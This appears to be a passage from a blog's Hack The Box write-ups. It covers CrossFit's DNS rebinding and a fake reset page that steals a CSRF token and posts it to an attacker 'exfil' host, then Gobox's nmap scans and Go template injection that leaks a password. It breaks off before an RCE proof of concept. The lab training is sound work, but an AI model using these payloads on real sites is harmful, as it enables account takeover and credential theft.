<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/Crypt0s/FakeDns
<span style="color:#8be9fd;font-style:italic">cd</span> /opt/FakeDNS
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;A XXXemployees.crossfit.htb 127.0.0.1&#34;</span> &gt;&gt; /tmp/fakeDNS_config
python3 ./fakedns.py -c /tmp/fakeDNS_config
&gt;&gt; Parsed <span style="color:#bd93f9">1</span> rules from /tmp/fakeDNS_config
&gt;&gt; Matched Request - XXXemployees.crossfit.htb.
&gt;&gt; Matched Request - XXXemployees.crossfit.htb.
────────────────────────────────────────────────────────────────────────────────────────────────────────────
sudo tcpdump -ni utun1 udp port <span style="color:#bd93f9">53</span>
05:20:11.932369 IP 10.10.10.232.39072 &gt; 10.10.14.112.53: 20866+ <span style="color:#ff79c6">[</span>1au<span style="color:#ff79c6">]</span> A? XXXemployees.crossfit.htb. <span style="color:#ff79c6">(</span>54<span style="color:#ff79c6">)</span>
05:20:11.935490 IP 10.10.14.112.53 &gt; 10.10.10.232.39072: 20866* 1/0/0 A 127.0.0.1 <span style="color:#ff79c6">(</span>59<span style="color:#ff79c6">)</span>
05:20:11.988231 IP 10.10.10.232.17678 &gt; 10.10.14.112.53: 5585+ <span style="color:#ff79c6">[</span>1au<span style="color:#ff79c6">]</span> A? XXXemployees.crossfit.htb. <span style="color:#ff79c6">(</span>54<span style="color:#ff79c6">)</span>
05:20:11.988685 IP 10.10.14.112.53 &gt; 10.10.10.232.17678: 5585* 1/0/0 A 127.0.0.1 <span style="color:#ff79c6">(</span>59<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>We successfully received the message: <code>Reset link sent, please check your email.</code></li>
<li>There is two Matched Request, first bet is: first match is Host header resolution or some validation on the host and second is admin clicking.</li>
<li>Once the email sent, I need to rebind to my IP address instead of 127.0.0.1, otherwise the attacker machine won&rsquo;t receive the HTTP GET when the admin click the link. FakeDNS allows DNS rebinding after a certain amount of tries.
Apparently, two first Match requests are for validation only, otherwise is I have an error message otherwise. So I decide to rebind after 2 requests.</li>
</ul>
<p>A third MAtch requests appears and indeed we are able to receive the http GET</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;A XXXemployees.crossfit.htb 127.0.0.1 1%10.10.14.112&#34;</span>
python3 ./fakedns.py -c /tmp/fakeDNS_config
&gt;&gt; Parsed <span style="color:#bd93f9">1</span> rules from /tmp/fakeDNS_config
&gt;&gt; Matched Request - XXXemployees.crossfit.htb.
&gt;&gt; Matched Request - XXXemployees.crossfit.htb.
&gt;&gt; Matched Request - XXXemployees.crossfit.htb.
────────────────────────────────────────────────────────────────────────────────────────────────────────────
nc -lnvp <span style="color:#bd93f9">80</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">80</span>
Connection received on 172.19.0.1 <span style="color:#bd93f9">56234</span>
GET /password-reset.php?token<span style="color:#ff79c6">=</span>b3fd0ec1bb5afe4245b09c55418171cbbef212af447542b4d00249a463f2e4c3d186a80113b56826bd1176380cc46f1f57a29d77713dc53a74f0c620a4608b55 HTTP/1.1
Host: xxxemployees.crossfit.htb
User-Agent: Mozilla/5.0 <span style="color:#ff79c6">(</span>X11; OpenBSD amd64; rv:82.0<span style="color:#ff79c6">)</span> Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;<span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>0.9,image/webp,*/*;<span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>0.8
Accept-Language: en-US,en;<span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://crossfit-club.htb/
Upgrade-Insecure-Requests: <span style="color:#bd93f9">1</span>
Upgrade-Insecure-Requests: <span style="color:#bd93f9">1</span>
</code></pre></td></tr></table>
</div>
</div><p>Unfortunately we receive error message: <code>We are sorry, but password reset has been temporarily disabled.</code>, which means the Admin has disabled password-reset.</p>
<p>As we can&rsquo;t password reset, we need instead to have the admin create a new account</p>
<h2 id="register-a-new-account">register a new account</h2>
<h3 id="serve-a-fake-password-resetphp">Serve a fake password-reset.php</h3>
<p>We can serve a fake password-reset.php containing some Javascript:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    &lt;<span style="color:#ff79c6">title</span>&gt;pwned&lt;/<span style="color:#ff79c6">title</span>&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;
  &lt;<span style="color:#ff79c6">body</span>&gt;
    &lt;<span style="color:#ff79c6">script</span>&gt;
      <span style="color:#8be9fd;font-style:italic">var</span> req <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
      req.open(<span style="color:#f1fa8c">&#34;POST&#34;</span>, <span style="color:#f1fa8c">&#34;http:/xxxemployees.crossfit.htb/test&#34;</span>, <span style="color:#ff79c6">false</span>);
      req.send(<span style="color:#f1fa8c">&#34;0xdf was here&#34;</span>);
    &lt;/<span style="color:#ff79c6">script</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>When using <code>python3 -m http.server 80</code> as server, http://127.0.0.1/password-reset.php is considered a binary and therefore is downloaded as a file and not as an html page because of HTTP header <code>Content-Type: application/octet/stream</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -i http://127.0.0.1/password-reset.php
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
Server: SimpleHTTP/0.6 Python/3.8.2
Content-type: application/octet-stream
</code></pre></td></tr></table>
</div>
</div><p>It is better to use instead <code>php -S 0.0.0.0:80</code>, in case the page is loaded by a browser engine to execute the Javascript.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -i http://127.0.0.1/password-reset.php
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
X-Powered-By: PHP/7.4.3
Content-type: text/html; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>UTF-8
</code></pre></td></tr></table>
</div>
</div><p>We can now attempt again:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -i -s -k -X <span style="color:#f1fa8c">$&#39;POST&#39;</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    -H <span style="color:#f1fa8c">$&#39;Host: XXXemployees.crossfit.htb&#39;</span> -H <span style="color:#f1fa8c">$&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0&#39;</span> -H <span style="color:#f1fa8c">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span> -H <span style="color:#f1fa8c">$&#39;Accept-Language: en-GB,en;q=0.5&#39;</span> -H <span style="color:#f1fa8c">$&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span style="color:#f1fa8c">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#f1fa8c">$&#39;Content-Length: 33&#39;</span> -H <span style="color:#f1fa8c">$&#39;Origin: http://employees.crossfit.htb&#39;</span> -H <span style="color:#f1fa8c">$&#39;DNT: 1&#39;</span> -H <span style="color:#f1fa8c">$&#39;Connection: close&#39;</span> -H <span style="color:#f1fa8c">$&#39;Referer: http://employees.crossfit.htb/password-reset.php&#39;</span> -H <span style="color:#f1fa8c">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    --data-binary <span style="color:#f1fa8c">$&#39;email=david.palmer%40crossfit.htb&#39;</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>    <span style="color:#f1fa8c">$&#39;http://xxxemployees.crossfit.htb/password-reset.php&#39;</span> | grep alert | cut -d<span style="color:#f1fa8c">&#39;&gt;&#39;</span> -f2 | cut -d<span style="color:#f1fa8c">&#39;&lt;&#39;</span> -f1
</code></pre></td></tr></table>
</div>
</div><p>it works better as we can see <code>/test</code> is being fetched. While it shows as a GET instead of a POST, this is a server bug as network capture shows it is really a POST and not a GET.</p>
<pre tabindex="0"><code>[Mon Sep  6 06:35:20 2021] PHP 7.4.3 Development Server (http://0.0.0.0:80) started
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56306 Accepted
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56306 [200]: GET /password-reset.php?token=59e175d51be27aff228c9ac726d665af76c2c25fa09ac1ee2bcce3e18721b01c7fee154fc4a1c445d41207552da6ef8f0b19085fd9da089f4be05a34d2ae4d2f
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56306 Closing
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56310 Accepted
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56310 [404]: GET /xxxemployees.crossfit.htb/test - No such file or directory
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56310 Closing
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56314 Accepted
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56314 [404]: GET /favicon.ico - No such file or directory
[Mon Sep  6 06:36:30 2021] 172.19.0.1:56314 Closing
</code></pre><p><code>tcpdump -ni eth0 tcp port 80</code>:</p>
<pre tabindex="0"><code>06:57:17.287543 IP 172.19.0.1.56344 &gt; 172.19.0.2.80: Flags [P.], seq 1:531, ack 1, win 502, options [nop,nop,TS val 2134278899 ecr 2630019676], length 530: HT
TP: GET /password-reset.php?token=442da129fe86666757485048c2fbce80f591f9c438c7ebd032acdde715ccffe557db7ed8a57c8252635424e6131ace3907bb0dfd12f0da07ae2fe762b472
d5de HTTP/1.1
[..]
06:57:17.477466 IP 172.19.0.1.56348 &gt; 172.19.0.2.80: Flags [P.], seq 1:588, ack 1, win 502, options [nop,nop,TS val 2134279089 ecr 2630019866], length 587: HT
TP: POST /xxxemployees.crossfit.htb/test HTTP/1.12
</code></pre><h2 id="cors-bypass">CORS Bypass</h2>
<ul>
<li>we need a CSRF token to make the request to <code>crossfit-club.htb/api/signup</code>.</li>
<li>we also need to use withCredentials to keep the cookie the same throughout the entire session</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    &lt;<span style="color:#ff79c6">title</span>&gt;pwned&lt;/<span style="color:#ff79c6">title</span>&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;
  &lt;<span style="color:#ff79c6">body</span>&gt;
    &lt;<span style="color:#ff79c6">script</span>&gt;
      <span style="color:#8be9fd;font-style:italic">var</span> req_token <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
      req_token.onreadystatechange <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span> () {
        <span style="color:#ff79c6">if</span> (req_token.readyState <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>) {
          <span style="color:#8be9fd;font-style:italic">var</span> token <span style="color:#ff79c6">=</span> JSON.parse(req_token.response).token;
          <span style="color:#8be9fd;font-style:italic">var</span> req_exfil <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
          req_exfil.open(
            <span style="color:#f1fa8c">&#34;POST&#34;</span>,
            <span style="color:#f1fa8c">&#34;http://0xdf-employees.crossfit.htb:81/exfil&#34;</span>,
            <span style="color:#ff79c6">false</span>
          );
          req_exfil.send(token);
        }
      };
      req_token.open(<span style="color:#f1fa8c">&#34;GET&#34;</span>, <span style="color:#f1fa8c">&#34;http://crossfit-club.htb/api/auth&#34;</span>);
      req_token.withCredentials <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
      req_token.send();
    &lt;/<span style="color:#ff79c6">script</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Gobox</title><link>https://0xade1.github.io/posts/2021/09/htb-gobox/</link><pubDate>Sat, 04 Sep 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/htb-gobox/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 nmap -v -p- --min-rate=5000 -T4 10.10.11.113 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 8080/tcp open http-proxy nmap -p22,80,4566,8080 -sC -sV 10.10.11.113 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx |\_http-title: Hacking eSports | {{.Title}} 4566/tcp open http nginx |\_http-title: 403 Forbidden 8080/tcp open http nginx |\_http-title: Hacking eSports | Home page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel gobuster 1 gobuster dir -u http://10.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -v -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5000</span> -T4 10.10.11.113
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
4566/tcp open kwtc
8080/tcp open http-proxy

nmap -p22,80,4566,8080 -sC -sV 10.10.11.113
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
80/tcp open http nginx
|<span style="color:#f1fa8c">\_</span>http-title: Hacking eSports | <span style="color:#ff79c6">{{</span>.Title<span style="color:#ff79c6">}}</span>
4566/tcp open http nginx
|<span style="color:#f1fa8c">\_</span>http-title: <span style="color:#bd93f9">403</span> Forbidden
8080/tcp open http nginx
|<span style="color:#f1fa8c">\_</span>http-title: Hacking eSports | Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></td></tr></table>
</div>
</div><h1 id="gobuster">gobuster</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.11.113 -w /opt/dictionaries/directory-list-2.3-medium.txt -t <span style="color:#bd93f9">50</span> -x php
</code></pre></td></tr></table>
</div>
</div><h1 id="ssti">SSTI</h1>
<p>Browsing port 80 reveals it is running php. On port 8080 we have a golang server <code>X-Forwarded-Server: golang</code> and it returns a login form.
The login form has a /forgot/ form to reset the password. Knowing the site runs in golang with some templating we can attempt <code>SSTI</code> Server Side Template Injection</p>
<p>We try first to POST <code>email={{html &quot;SSTI&quot;}}</code> and we indeed have a response with the html word SSTI. Which means the template has successfully render the word SSTI in html.
As per this <a href="https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html">go SSTI blog post</a>, we can get the data struct being passed as input to the template with <code>{{.}}</code> and it works:</p>
<pre tabindex="0"><code>Email Sent To: {1 ippsec@hacking.esports ippsSecretPassword}
</code></pre><p>We can login with those credentials and we can see the page go source code,
with a dangerous function <code>DebugCmd</code> allowing remote code execution as per this PoC:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
